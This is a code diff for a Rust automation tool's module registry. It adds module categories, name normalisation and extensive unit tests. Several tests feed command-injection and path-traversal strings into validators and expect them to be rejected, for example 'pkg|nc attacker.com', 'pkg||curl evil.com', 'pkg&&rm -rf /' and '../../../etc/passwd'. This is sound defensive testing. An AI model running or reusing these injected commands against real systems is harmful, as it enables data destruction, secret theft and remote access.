+            .iter()
+            .filter_map(|(name, cat)| {
+                if *cat == category {
+                    Some(name.as_str())
+                } else {
+                    None
+                }
+            })
+            .collect()
+    }
+
+    /// Get all categories and their module counts
+    pub fn category_stats(&self) -> HashMap<ModuleCategory, usize> {
+        let mut stats = HashMap::new();
+        for category in self.categories.values() {
+            *stats.entry(*category).or_insert(0) += 1;
+        }
+        stats
+    }
+
     /// Get a module by name
     pub fn get(&self, name: &str) -> Option<Arc<dyn Module>> {
-        self.modules.get(name).cloned()
+        let normalized = Self::normalize_module_name(name);
+        self.modules.get(normalized).cloned()
     }
 
     /// Check if a module exists
     pub fn contains(&self, name: &str) -> bool {
-        self.modules.contains_key(name)
+        let normalized = Self::normalize_module_name(name);
+        self.modules.contains_key(normalized)
     }
 
     /// Get all module names
@@ -932,12 +1665,8 @@ impl ModuleRegistry {
             }
         }
 
-        // Execute based on mode
-        if context.check_mode {
-            module.check(params, context)
-        } else {
-            module.execute(params, context)
-        }
+        // Execute module - modules handle check_mode internally via context.check_mode
+        module.execute(params, context)
     }
 }
 
@@ -992,6 +1721,15 @@ mod tests {
 
         let module = registry.get("test").unwrap();
         assert_eq!(module.name(), "test");
+    }
+
+    #[test]
+    fn test_module_registry_builtin_fqcn() {
+        let mut registry = ModuleRegistry::new();
+        registry.register(Arc::new(TestModule));
+
+        assert!(registry.get("ansible.builtin.test").is_some());
+        assert!(registry.get("ansible.legacy.test").is_some());
     }
 
     #[test]
@@ -1071,11 +1809,12 @@ mod tests {
         assert!(validate_package_name("").is_err());
 
         // Command injection attempts
-        assert!(validate_package_name("pkg; rm -rf /").is_err());
-        assert!(validate_package_name("pkg && cat /etc/passwd").is_err());
-        assert!(validate_package_name("pkg | wget evil.com").is_err());
-        assert!(validate_package_name("$(whoami)").is_err());
-        assert!(validate_package_name("`id`").is_err());
+        assert!(validate_package_name("pkg$(whoami)").is_err());
+        assert!(validate_package_name("pkg`id`").is_err());
+        assert!(validate_package_name("pkg|nc attacker.com").is_err());
+        assert!(validate_package_name("pkg&&reboot").is_err());
+        assert!(validate_package_name("pkg||curl evil.com").is_err());
+        assert!(validate_package_name("pkg\\`rm\\ -rf\\ /").is_err());
 
         // Other invalid characters
         assert!(validate_package_name("pkg name").is_err()); // space
@@ -1087,5 +1826,466 @@ mod tests {
         assert!(validate_package_name("pkg\"name").is_err()); // double quote
         assert!(validate_package_name("pkg>file").is_err()); // redirect
         assert!(validate_package_name("pkg<file").is_err()); // redirect
+    }
+
+    #[test]
+    fn test_validate_shell_safe_string_rejects_injection() {
+        assert!(validate_shell_safe_string("pkg$(whoami)", "Package name").is_err());
+        assert!(validate_shell_safe_string("pkg`reboot`", "Package name").is_err());
+        assert!(validate_shell_safe_string("pkg||curl evil.com", "Package name").is_err());
+        assert!(validate_shell_safe_string("pkg&&rm -rf /", "Package name").is_err());
+    }
+
+    #[test]
+    fn test_validate_shell_safe_string_accepts_valid() {
+        assert!(validate_shell_safe_string("nginx", "Package name").is_ok());
+        assert!(validate_shell_safe_string("python3.11", "Package name").is_ok());
+        assert!(validate_shell_safe_string("lib-dev", "Package name").is_ok());
+        assert!(validate_shell_safe_string("g++", "Package name").is_ok());
+    }
+
+    #[test]
+    fn test_validate_command_args() {
+        assert!(validate_command_args("nginx -c /etc/nginx.conf").is_ok());
+        assert!(validate_command_args("--force").is_ok());
+        assert!(validate_command_args("").is_ok()); // Empty is fine
+    }
+
+    #[test]
+    fn test_validate_command_args_rejects_dangerous() {
+        assert!(validate_command_args("$(cat /etc/passwd)").is_err());
+        assert!(validate_command_args("nginx; reboot").is_err());
+        assert!(validate_command_args("pkg && reboot").is_err());
+        assert!(validate_command_args("cmd || curl evil.com").is_err());
+    }
+
+    #[test]
+    fn test_normalize_path() {
+        // Simple relative path
+        assert!(normalize_path("./file.txt", None).is_ok());
+
+        // Path with dots
+        assert!(normalize_path("../parent", None).is_ok());
+
+        // Absolute path
+        assert!(normalize_path("/etc/passwd", None).is_ok());
+    }
+
+    #[test]
+    fn test_normalize_path_with_base_dir() {
+        let base = PathBuf::from("/safe/dir");
+
+        // Path within base directory
+        assert!(normalize_path("/safe/dir/file.txt", Some(&base)).is_ok());
+
+        // Path that tries to escape base directory
+        assert!(normalize_path("/etc/passwd", Some(&base)).is_err());
+
+        // Parent directory traversal
+        assert!(normalize_path("../../etc/passwd", Some(&base)).is_err());
+    }
+
+    #[test]
+    fn test_validate_path_param_rejects_traversal() {
+        assert!(validate_path_param("../../../etc/passwd", "creates").is_err());
+        assert!(validate_path_param("./../../tmp", "removes").is_err());
+        assert!(validate_path_param("/var/log/../root", "creates").is_err());
+        assert!(validate_path_param("..", "creates").is_err());
+    }
+
+    #[test]
+    fn test_validate_path_param_allows_relative() {
+        assert!(validate_path_param("./tmp/marker.txt", "creates").is_ok());
+        assert!(validate_path_param("subdir/file", "removes").is_ok());
+        assert!(validate_path_param("marker.txt", "creates").is_ok());
+    }
+
+    #[test]
+    fn test_validate_path_param_rejects_invalid() {
+        // Null bytes
+        assert!(validate_path_param("/path\0null", "creates").is_err());
+
+        // Empty path
+        assert!(validate_path_param("", "creates").is_err());
+
+        // Newlines
+        assert!(validate_path_param("/path\ninjection", "creates").is_err());
+        assert!(validate_path_param("/path\rfake", "removes").is_err());
+    }
+
+    #[test]
+    fn test_module_output_to_result_json_basic() {
+        let output = ModuleOutput::changed("Task completed");
+
+        let json = output.to_result_json();
+
+        assert_eq!(json["changed"], true);
+        assert_eq!(json["failed"], false);
+        assert_eq!(json["skipped"], false);
+        assert_eq!(json["msg"], "Task completed");
+    }
+
+    #[test]
+    fn test_module_output_to_result_json_with_command_output() {
+        let mut output = ModuleOutput::ok("Command executed");
+        output.rc = Some(0);
+        output.stdout = Some("Hello, World!".to_string());
+        output.stderr = Some("warning message".to_string());
+
+        let json = output.to_result_json();
+
+        assert_eq!(json["rc"], 0);
+        assert_eq!(json["stdout"], "Hello, World!");
+        assert_eq!(json["stderr"], "warning message");
+        assert_eq!(json["stdout_lines"], serde_json::json!(["Hello, World!"]));
+        assert_eq!(json["stderr_lines"], serde_json::json!(["warning message"]));
+    }
+
+    #[test]
+    fn test_module_output_to_result_json_multiline() {
+        let mut output = ModuleOutput::ok("Command executed");
+        output.stdout = Some("line1\nline2\nline3".to_string());
+
+        let json = output.to_result_json();
+
+        assert_eq!(
+            json["stdout_lines"],
+            serde_json::json!(["line1", "line2", "line3"])
+        );
+    }
+
+    #[test]
+    fn test_module_output_to_result_json_with_custom_data() {
+        let output = ModuleOutput::changed("File created")
+            .with_data("path", serde_json::json!("/tmp/file.txt"))
+            .with_data("size", serde_json::json!(1024))
+            .with_data("owner", serde_json::json!("root"));
+
+        let json = output.to_result_json();
+
+        assert_eq!(json["path"], "/tmp/file.txt");
+        assert_eq!(json["size"], 1024);
+        assert_eq!(json["owner"], "root");
+    }
+
+    #[test]
+    fn test_module_output_to_result_json_failed() {
+        let output = ModuleOutput::failed("Command not found");
+
+        let json = output.to_result_json();
+
+        assert_eq!(json["changed"], false);
+        assert_eq!(json["failed"], true);
+        assert_eq!(json["skipped"], false);
+        assert_eq!(json["msg"], "Command not found");
+    }
+
+    #[test]
+    fn test_module_output_to_result_json_skipped() {
+        let output = ModuleOutput::skipped("Skipped in check mode");
+
+        let json = output.to_result_json();
+
+        assert_eq!(json["changed"], false);
+        assert_eq!(json["failed"], false);
+        assert_eq!(json["skipped"], true);
+    }
+
+    // ModuleContextBuilder tests
+
+    #[test]
+    fn test_module_context_builder_defaults() {
+        let ctx = ModuleContextBuilder::new().build().unwrap();
+
+        assert!(!ctx.check_mode);
+        assert!(!ctx.diff_mode);
+        assert_eq!(ctx.verbosity, 0);
+        assert!(ctx.vars.is_empty());
+        assert!(ctx.facts.is_empty());
+        assert!(ctx.work_dir.is_none());
+        assert!(!ctx.r#become);
+        assert!(ctx.become_method.is_none());
+        assert!(ctx.become_user.is_none());
+        assert!(ctx.connection.is_none());
+    }
+
+    #[test]
+    fn test_module_context_builder_check_mode() {
+        let ctx = ModuleContextBuilder::new()
+            .check_mode(true)
+            .build()
+            .unwrap();
+
+        assert!(ctx.check_mode);
+    }
+
+    #[test]
+    fn test_module_context_builder_diff_mode() {
+        let ctx = ModuleContextBuilder::new().diff_mode(true).build().unwrap();
+
+        assert!(ctx.diff_mode);
+    }
+
+    #[test]
+    fn test_module_context_builder_verbosity_valid() {
+        for v in 0..=4 {
+            let ctx = ModuleContextBuilder::new().verbosity(v).build().unwrap();
+            assert_eq!(ctx.verbosity, v);
+        }
+    }
+
+    #[test]
+    fn test_module_context_builder_verbosity_invalid() {
+        let result = ModuleContextBuilder::new().verbosity(5).build();
+
+        assert!(result.is_err());
+        assert_eq!(
+            result.unwrap_err(),
+            ModuleContextBuilderError::InvalidVerbosity(5)
+        );
+    }
+
+    #[test]
+    fn test_module_context_builder_vars() {
+        let mut vars = HashMap::new();
+        vars.insert("key1".to_string(), serde_json::json!("value1"));
+        vars.insert("key2".to_string(), serde_json::json!(42));
+
+        let ctx = ModuleContextBuilder::new().vars(vars).build().unwrap();
+
+        assert_eq!(ctx.vars.len(), 2);
+        assert_eq!(ctx.vars["key1"], serde_json::json!("value1"));
+        assert_eq!(ctx.vars["key2"], serde_json::json!(42));
+    }
+
+    #[test]
+    fn test_module_context_builder_var_single() {
+        let ctx = ModuleContextBuilder::new()
+            .var("key1", serde_json::json!("value1"))
+            .var("key2", serde_json::json!(42))
+            .build()
+            .unwrap();
+
+        assert_eq!(ctx.vars.len(), 2);
+        assert_eq!(ctx.vars["key1"], serde_json::json!("value1"));
+    }
+
+    #[test]
+    fn test_module_context_builder_facts() {
+        let mut facts = HashMap::new();
+        facts.insert("os".to_string(), serde_json::json!("linux"));
+
+        let ctx = ModuleContextBuilder::new().facts(facts).build().unwrap();
+
+        assert_eq!(ctx.facts.len(), 1);
+        assert_eq!(ctx.facts["os"], serde_json::json!("linux"));
+    }
+
+    #[test]
+    fn test_module_context_builder_fact_single() {
+        let ctx = ModuleContextBuilder::new()
+            .fact("os", serde_json::json!("linux"))
+            .fact("arch", serde_json::json!("x86_64"))
+            .build()
+            .unwrap();
+
+        assert_eq!(ctx.facts.len(), 2);
+    }
+
+    #[test]
+    fn test_module_context_builder_work_dir() {
+        let ctx = ModuleContextBuilder::new()
+            .work_dir("/tmp/work")
+            .build()
+            .unwrap();
+
+        assert_eq!(ctx.work_dir, Some("/tmp/work".to_string()));
+    }
+
+    #[test]
+    fn test_module_context_builder_become() {
+        let ctx = ModuleContextBuilder::new()
+            .become_enabled(true)
+            .become_method("sudo")
+            .become_user("root")
+            .build()
+            .unwrap();
+
+        assert!(ctx.r#become);
+        assert_eq!(ctx.become_method, Some("sudo".to_string()));
+        assert_eq!(ctx.become_user, Some("root".to_string()));
+    }
+
+    #[test]
+    fn test_module_context_builder_build_unchecked() {
+        // This should succeed even with invalid verbosity
+        let ctx = ModuleContextBuilder::new().verbosity(10).build_unchecked();
+
+        // Verbosity is clamped to 4
+        assert_eq!(ctx.verbosity, 4);
+    }
+
+    #[test]
+    fn test_module_context_builder_chaining() {
+        let ctx = ModuleContextBuilder::new()
+            .check_mode(true)
+            .diff_mode(true)
+            .verbosity(3)
+            .var("test", serde_json::json!("value"))
+            .fact("os", serde_json::json!("linux"))
+            .work_dir("/tmp")
+            .become_enabled(true)
+            .become_method("sudo")
+            .become_user("admin")
+            .build()
+            .unwrap();
+
+        assert!(ctx.check_mode);
+        assert!(ctx.diff_mode);
+        assert_eq!(ctx.verbosity, 3);
+        assert_eq!(ctx.vars.len(), 1);
+        assert_eq!(ctx.facts.len(), 1);
+        assert_eq!(ctx.work_dir, Some("/tmp".to_string()));
+        assert!(ctx.r#become);
+        assert_eq!(ctx.become_method, Some("sudo".to_string()));
+        assert_eq!(ctx.become_user, Some("admin".to_string()));
+    }
+
+    #[test]
+    fn test_module_context_builder_static_method() {
+        // Test the static builder() method on ModuleContext
+        let ctx = ModuleContext::builder().check_mode(true).build().unwrap();
+
+        assert!(ctx.check_mode);
+    }
+
+    // ========================================================================
+    // ModuleCategory and Registry Category Tests
+    // ========================================================================
+
+    #[test]
+    fn test_module_category_enum() {
+        // Test that all categories exist and can be compared
+        assert_eq!(ModuleCategory::Commands, ModuleCategory::Commands);
+        assert_ne!(ModuleCategory::Commands, ModuleCategory::Packages);
+
+        // Test all category variants
+        let categories = vec![
+            ModuleCategory::Commands,
+            ModuleCategory::Packages,
+            ModuleCategory::Files,
+            ModuleCategory::System,
+            ModuleCategory::SourceControl,
+            ModuleCategory::Network,
+            ModuleCategory::Cloud,
+            ModuleCategory::Containers,
+            ModuleCategory::Database,
+            ModuleCategory::Logic,
+            ModuleCategory::Facts,
+            ModuleCategory::Security,
+            ModuleCategory::Windows,
+        ];
+        assert_eq!(categories.len(), 13);
+    }
+
+    #[test]
+    fn test_registry_with_categories() {
+        let registry = ModuleRegistry::with_builtins();
+
+        // Test that command module is in Commands category
+        assert_eq!(
+            registry.get_category("command"),
+            Some(ModuleCategory::Commands)
+        );
+
+        // Test that shell module is in Commands category
+        assert_eq!(
+            registry.get_category("shell"),
+            Some(ModuleCategory::Commands)
+        );
+
+        // Test that apt module is in Packages category
+        assert_eq!(registry.get_category("apt"), Some(ModuleCategory::Packages));
+
+        // Test that copy module is in Files category
+        assert_eq!(registry.get_category("copy"), Some(ModuleCategory::Files));
+
+        // Test that service module is in System category
+        assert_eq!(
+            registry.get_category("service"),
+            Some(ModuleCategory::System)
+        );
+
+        // Test that git module is in SourceControl category
+        assert_eq!(
+            registry.get_category("git"),
+            Some(ModuleCategory::SourceControl)
+        );
+
+        // Test that debug module is in Logic category
+        assert_eq!(registry.get_category("debug"), Some(ModuleCategory::Logic));
+
+        // Test non-existent module returns None
+        assert_eq!(registry.get_category("nonexistent"), None);
+    }
+
+    #[test]
+    fn test_modules_by_category() {
+        let registry = ModuleRegistry::with_builtins();
+
+        // Test Commands category has expected modules
+        let commands = registry.modules_by_category(ModuleCategory::Commands);
+        assert!(commands.contains(&"command"));
+        assert!(commands.contains(&"shell"));
+        assert!(commands.contains(&"raw"));
+        assert!(commands.contains(&"script"));
+
+        // Test Logic category has expected modules
+        let logic = registry.modules_by_category(ModuleCategory::Logic);
+        assert!(logic.contains(&"debug"));
+        assert!(logic.contains(&"assert"));
+        assert!(logic.contains(&"fail"));
+        assert!(logic.contains(&"set_fact"));
+
+        // Test Files category has expected modules
+        let files = registry.modules_by_category(ModuleCategory::Files);
+        assert!(files.contains(&"copy"));
+        assert!(files.contains(&"file"));
+        assert!(files.contains(&"template"));
+    }
+
+    #[test]
+    fn test_category_stats() {
+        let registry = ModuleRegistry::with_builtins();
+        let stats = registry.category_stats();
+
+        // Commands category should have 4 modules
+        assert_eq!(stats.get(&ModuleCategory::Commands), Some(&4));
+
+        // Logic category should have 6 modules
+        assert_eq!(stats.get(&ModuleCategory::Logic), Some(&6));
+
+        // All counted modules should be non-zero
+        for (category, count) in &stats {
+            assert!(*count > 0, "Category {:?} has no modules", category);
+        }
+    }
+
+    #[test]
+    fn test_register_with_category() {
+        let mut registry = ModuleRegistry::new();
+
+        // Register a test module with a category
+        registry.register_with_category(Arc::new(TestModule), ModuleCategory::Logic);
+
+        // Verify the module is registered
+        assert!(registry.contains("test"));
+
+        // Verify the category is set
+        assert_eq!(registry.get_category("test"), Some(ModuleCategory::Logic));
+
+        // Verify it appears in modules_by_category
+        let logic_modules = registry.modules_by_category(ModuleCategory::Logic);
+        assert!(logic_modules.contains(&"test"));
     }
 }
